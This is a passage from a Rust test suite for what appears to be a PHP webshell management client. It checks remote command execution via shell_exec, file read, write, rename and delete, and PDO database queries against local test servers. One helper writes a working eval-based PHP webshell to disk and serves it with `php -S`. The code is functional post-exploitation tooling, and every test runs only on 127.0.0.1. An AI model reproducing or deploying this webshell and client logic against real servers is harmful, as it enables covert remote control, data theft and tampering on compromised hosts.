        let result = proto.probe(&profile(&url), &settings()).expect("探测应成功");
        assert_eq!(result.server, "Linux fake");
        assert_eq!(result.web_server, "Apache");
        assert_eq!(result.runtime, "8.2.0");

        // 断言服务器收到的请求：密码正确、载荷是 base64 且包含鉴权模板与 PWD 字面量
        let (k, code) = rx.recv_timeout(std::time::Duration::from_secs(5)).expect("应收到请求");
        assert_eq!(k, "secret");
        assert!(code.contains("AUTH_FAIL"), "载荷应包含鉴权失败分支");
        assert!(code.contains("'secret'"), "载荷应包含密码字面量");
    }

    #[test]
    fn wrong_password_returns_auth_failed() {
        // 模拟真实 stub 的鉴权行为：密码不匹配时直接输出 AUTH_FAIL 明文
        let (url, _rx) = spawn_fake_server(|_code, k| {
            if k == "secret" {
                Some(json!({"ok": true, "data": {}}))
            } else {
                None
            }
        });
        let proto = PhpProtocol;
        let mut profile = profile(&url);
        profile.password = "wrong".into();
        let result = proto.probe(&profile, &settings());
        assert!(
            matches!(result, Err(ProtocolError::AuthFailed(_))),
            "密码错误时应报鉴权失败，实际：{result:?}"
        );
    }

    #[test]
    fn exec_round_trip() {
        let (url, rx) = spawn_fake_server(|_code, _k| {
            Some(json!({"ok": true, "data": {"stdout": base64::engine::general_purpose::STANDARD.encode("uid=0(root)")}}))
        });
        let profile = profile(&url);
        let settings = settings();
        let (session, _) = PhpProtocol.connect(&profile, &settings).unwrap();
        let output = PhpProtocol
            .execute_command(session.as_ref(), "id", &settings)
            .expect("执行应成功");
        assert_eq!(output.stdout, "uid=0(root)");

        // connect 内部会先发一次 probe 请求，因此第二条消息才是 exec 载荷
        let _ = rx
            .recv_timeout(std::time::Duration::from_secs(5))
            .expect("应收到 probe 请求");
        let (k, code) = rx
            .recv_timeout(std::time::Duration::from_secs(5))
            .expect("应收到 exec 请求");
        assert_eq!(k, "secret");
        assert!(code.contains("shell_exec"), "载荷应包含 shell_exec");
    }

    #[test]
    fn auth_fail_text_is_detected() {
        // 服务器回送 AUTH_FAIL 明文时，客户端必须报鉴权失败而不是解析错误
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        std::thread::spawn(move || {
            for stream in listener.incoming() {
                let Ok(mut stream) = stream else { continue };
                let mut buf = [0u8; 8192];
                let _ = stream.read(&mut buf);
                let body = "AUTH_FAIL";
                let response = format!(
                    "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                    body.len(),
                    body
                );
                let _ = stream.write_all(response.as_bytes());
            }
        });
        let proto = PhpProtocol;
        let result = proto.probe(&profile(&format!("http://{addr}")), &settings());
        assert!(matches!(result, Err(ProtocolError::AuthFailed(_))), "应报鉴权失败");
    }

    #[test]
    fn db_probe_payload_contains_pdo_and_whitelisted_driver() {
        // 校验载荷：PDO 模板 + base64 参数 + 驱动白名单外拒绝
        let (url, rx) = spawn_fake_server(|_code, _k| {
            Some(json!({"ok": true, "data": {"driver": "mysql", "databases": ["test"]}}))
        });
        let proto = PhpProtocol;
        let settings = settings();
        let session = PhpSession {
            endpoint: url.clone(),
            password: "secret".into(),
            client: build_client(&settings),
        };
        let conn = DbConnection {
            driver: "mysql".into(),
            host: Some("127.0.0.1".into()),
            port: Some(3306),
            username: Some("root".into()),
            password: Some("pw".into()),
            dbname: Some("test".into()),
        };
        let result = proto
            .db_probe(&session, &conn, &settings)
            .expect("探测应成功");
        assert_eq!(result.databases, vec!["test"]);

        let (k, code) = rx.recv_timeout(std::time::Duration::from_secs(5)).expect("应收到请求");
        assert_eq!(k, "secret");
        assert!(code.contains("new PDO"), "载荷应包含 PDO");
        let dsn_b64 = code.split("$dsn=base64_decode('").nth(1).unwrap().split('\'').next().unwrap();
        let decoded = String::from_utf8(B64.decode(dsn_b64).unwrap()).unwrap();
        assert!(decoded.contains("mysql:host=127.0.0.1;port=3306;charset=utf8mb4"), "DSN 应正确：{decoded}");

        // 驱动白名单外 → 拒绝
        let bad = DbConnection { driver: "oracle".into(), ..conn.clone() };
        let result = proto.db_probe(&session, &bad, &settings);
        assert!(matches!(result, Err(ProtocolError::NotSupported(_))), "未知驱动应被拒绝");
    }

    #[test]
    fn db_query_payload_contains_sql() {
        let (url, rx) = spawn_fake_server(|_code, _k| {
            Some(json!({"ok": true, "data": {"columns": ["id"], "rows": [["1"]], "affected": 0}}))
        });
        let proto = PhpProtocol;
        let settings = settings();
        let session = PhpSession {
            endpoint: url.clone(),
            password: "secret".into(),
            client: build_client(&settings),
        };
        let conn = DbConnection {
            driver: "sqlite".into(),
            host: None,
            port: None,
            username: None,
            password: None,
            dbname: Some("/tmp/db.sqlite".into()),
        };
        let result = proto
            .db_query(&session, &conn, "SELECT 1", &settings)
            .expect("查询应成功");
        assert_eq!(result.columns, vec!["id"]);
        assert_eq!(result.rows, vec![vec![Some("1".to_string())]]);

        let (k, code) = rx.recv_timeout(std::time::Duration::from_secs(5)).expect("应收到请求");
        assert_eq!(k, "secret");
        assert!(code.contains("$dbh->query($sql)"), "载荷应包含查询执行");
        // SQL 以 base64 嵌入
        let sql_b64 = code.split("$sql=base64_decode('").nth(1).unwrap().split('\'').next().unwrap();
        assert_eq!(String::from_utf8(B64.decode(sql_b64).unwrap()).unwrap(), "SELECT 1");
    }

    #[test]
    fn request_log_records_frames_with_redaction() {
        let (url, rx) = spawn_fake_server(|_code, _k| {
            Some(json!({"ok": true, "data": {"stdout": base64::engine::general_purpose::STANDARD.encode("out")}}))
        });
        let proto = PhpProtocol;
        let settings = settings();
        let session = PhpSession {
            endpoint: url.clone(),
            password: "secret".into(),
            client: build_client(&settings),
        };
        proto
            .execute_command(&session, "id", &settings)
            .expect("执行应成功");
        let _ = rx.recv_timeout(std::time::Duration::from_secs(5)).expect("应收到请求");

        // 端点过滤：仅本测试服务器的记录
        let records = list_requests(Some(&url));
        assert!(!records.is_empty(), "应存在请求记录");
        let record = records
            .iter()
            .find(|item| item.action == "exec")
            .expect("应有 exec 记录");
        assert_eq!(record.status, 200);
        assert!(record.payload.contains("shell_exec"), "载荷应包含业务代码");
        assert!(!record.payload.contains("secret"), "载荷中的密码应被脱敏");
        assert!(record.payload.contains("***"), "脱敏占位符应存在");
        // 响应体应为 nonce 帧包裹的 base64 JSON：从载荷提取 nonce 验证帧头
        let nonce = record
            .payload
            .split("echo '")
            .nth(1)
            .and_then(|part| part.split('\'').next())
            .unwrap_or_default();
        assert!(!nonce.is_empty(), "载荷应包含 nonce");
        assert!(record.response.starts_with(nonce), "响应应以 nonce 帧开头");

        // 端点过滤互不影响
        assert!(list_requests(Some("http://127.0.0.1:1/x")).is_empty());
    }

    #[test]
    fn request_log_truncates_long_payload() {
        let long = "A".repeat(3000);
        let payload = format!("echo '{}';", long);
        let response = "B".repeat(3000);
        record_request("test", "http://t", 200, 1, &payload, &response, "");
        let records = list_requests(Some("http://t"));
        assert!(!records.is_empty());
        assert!(records[0].payload.len() < 3000, "载荷应截断");
        assert!(records[0].response.len() < 3000, "响应应截断");
        assert!(records[0].payload.contains("已截断"));
    }

    #[test]
    fn real_php_sqlite_db_round_trip() {
        // 真实闭环：php -S + stub 上通过 pdo_sqlite 执行建表/插入/查询
        let Some((url, dir, mut child)) = spawn_php_server() else {
            eprintln!("跳过：未检测到 php 可执行文件");
            return;
        };
        let proto = PhpProtocol;
        let settings = settings();
        let session = PhpSession {
            endpoint: url,
            password: "secret".into(),
            client: build_client(&settings),
        };
        let db_path = dir.join("test.sqlite");
        let conn = DbConnection {
            driver: "sqlite".into(),
            host: None,
            port: None,
            username: None,
            password: None,
            dbname: Some(db_path.to_str().unwrap().into()),
        };

        // 探测：SQLite 返回文件库本身
        let probe = proto.db_probe(&session, &conn, &settings).expect("探测应成功");
        assert_eq!(probe.databases, vec![db_path.to_str().unwrap()]);

        // 建表 + 插入（非查询语句）
        proto
            .db_query(&session, &conn, "CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT)", &settings)
            .expect("建表应成功");
        let insert = proto
            .db_query(&session, &conn, "INSERT INTO users (name) VALUES ('alice'), ('bob')", &settings)
            .expect("插入应成功");
        assert_eq!(insert.affected, 2, "插入应影响 2 行");

        // 查询
        let query = proto
            .db_query(&session, &conn, "SELECT id, name FROM users ORDER BY id", &settings)
            .expect("查询应成功");
        assert_eq!(query.columns, vec!["id", "name"]);
        assert_eq!(query.rows, vec![
            vec![Some("1".into()), Some("alice".into())],
            vec![Some("2".into()), Some("bob".into())],
        ]);

        // 错误 SQL 返回业务错误
        let error = proto.db_query(&session, &conn, "SELECT * FROM missing", &settings);
        assert!(matches!(error, Err(ProtocolError::ServerError(_))), "错误 SQL 应报业务错误");

        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
    }

    // --- Level B：真实 PHP 往返（本机装有 php 时执行） ---

    /// 在本机临时目录写入 stub 并起 `php -S`，返回 (endpoint, 清理函数)。
    /// 若无 php 可执行则返回 None（跳过测试）。
    fn spawn_php_server() -> Option<(String, std::path::PathBuf, std::process::Child)> {
        let php = std::process::Command::new("php").arg("-v").output().ok()?;
        if !php.status.success() {
            return None;
        }
        let dir = std::env::temp_dir().join(format!("dosword-php-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).ok()?;
        std::fs::write(
            dir.join("shell.php"),
            r#"<?php @eval(base64_decode($_POST['x']));"#,
        )
        .ok()?;
        std::fs::create_dir_all(dir.join("www")).ok()?;
        std::fs::write(dir.join("www/hello.txt"), b"hello dosword").ok()?;

        let port = {
            // 取一个空闲端口
            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            listener.local_addr().unwrap().port()
        };
        let child = std::process::Command::new("php")
            .arg("-S")
            .arg(format!("127.0.0.1:{port}"))
            .arg("-t")
            .arg(&dir)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()
            .ok()?;
        // 等待服务器就绪
        let url = format!("http://127.0.0.1:{port}/shell.php");
        for _ in 0..50 {
            if std::net::TcpStream::connect(format!("127.0.0.1:{port}")).is_ok() {
                break;
            }
            std::thread::sleep(std::time::Duration::from_millis(100));
        }
        Some((url, dir, child))
    }

    #[test]
    fn real_php_full_round_trip() {
        let Some((url, dir, mut child)) = spawn_php_server() else {
            eprintln!("跳过：未检测到 php 可执行文件");
            return;
        };
        let mut profile = profile(&url);
        profile.password = "secret".into();

        let proto = PhpProtocol;
        let settings = settings();

        // 探测
        let probe = proto.probe(&profile, &settings).expect("探测应成功");
        assert!(!probe.server.is_empty(), "应返回真实服务器信息");
        assert_eq!(probe.separator, "/");

        // 连接 + 执行命令
        let (session, _) = proto.connect(&profile, &settings).expect("连接应成功");
        let output = proto
            .execute_command(session.as_ref(), "printf 'hello-cmd'", &settings)
            .expect("命令应执行成功");
        assert_eq!(output.stdout.trim(), "hello-cmd");

        // 文件操作往返：写 → 读 → 改名 → 列表 → 删除
        let file_path = dir.join("www/new.txt");
        let file_path_str = file_path.to_str().unwrap();
        proto
            .write_file(session.as_ref(), file_path_str, b"file-content-123", &settings)
            .expect("写入应成功");
        let content = proto
            .read_file(session.as_ref(), file_path_str, &settings)
            .expect("读取应成功");
        assert_eq!(content, b"file-content-123");

        // 建目录（递归）→ 目录内写文件 → 列表可见
        let sub_dir = dir.join("www/sub/deep");
        let sub_dir_str = sub_dir.to_str().unwrap();
        proto
            .create_dir(session.as_ref(), sub_dir_str, &settings)
            .expect("建目录应成功");
        let nested_file = sub_dir.join("nested.txt");
        proto
            .write_file(session.as_ref(), nested_file.to_str().unwrap(), b"nested", &settings)
            .expect("目录内写入应成功");
        let listing = proto
            .list_dir(session.as_ref(), sub_dir_str, &settings)
            .expect("列表应成功");
        assert!(listing.entries.iter().any(|e| e.name == "nested.txt"));

        // 分块读写：偏移 0 创建 → 偏移追加 → 区间/全量读取
        let chunked = dir.join("www/chunked.bin");
        let chunked_str = chunked.to_str().unwrap();
        proto
            .write_chunk(session.as_ref(), chunked_str, b"AAAA", 0, &settings)
            .expect("分块写入（创建）应成功");
        proto
            .write_chunk(session.as_ref(), chunked_str, b"BBBB", 4, &settings)
            .expect("分块写入（追加）应成功");
        let prefix = proto
            .read_chunk(session.as_ref(), chunked_str, 0, 4, &settings)
            .expect("区间读取应成功");
        assert_eq!(prefix, b"AAAA");
        let full = proto
            .read_chunk(session.as_ref(), chunked_str, 0, 0, &settings)
            .expect("全量读取应成功");
        assert_eq!(full, b"AAAABBBB");

        let renamed = dir.join("www/renamed.txt");
        proto
            .rename_path(session.as_ref(), file_path_str, renamed.to_str().unwrap(), &settings)
            .expect("改名应成功");

        let listing = proto
            .list_dir(session.as_ref(), dir.join("www").to_str().unwrap(), &settings)
            .expect("列表应成功");
        assert!(listing.entries.iter().any(|e| e.name == "renamed.txt"));
        assert!(listing.entries.iter().any(|e| e.name == "hello.txt"));

        proto
            .delete_path(session.as_ref(), renamed.to_str().unwrap(), &settings)
            .expect("删除应成功");
        let listing = proto
            .list_dir(session.as_ref(), dir.join("www").to_str().unwrap(), &settings)
            .expect("列表应成功");
        assert!(!listing.entries.iter().any(|e| e.name == "renamed.txt"));

        // 错误路径：删除非空目录应报业务错误
        let result = proto.delete_path(session.as_ref(), dir.to_str().unwrap(), &settings);
        assert!(
            matches!(result, Err(ProtocolError::ServerError(_))),
            "删除非空目录应失败"
        );

        // 说明：真实 stub 不存储密码（密码字面量由客户端嵌入载荷），
        // 因此"密码错误"（服务器额外校验 k）的场景由假服务器测试
        // `wrong_password_returns_auth_failed` 覆盖，这里不做重复断言。

        // 清理
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
    }
}
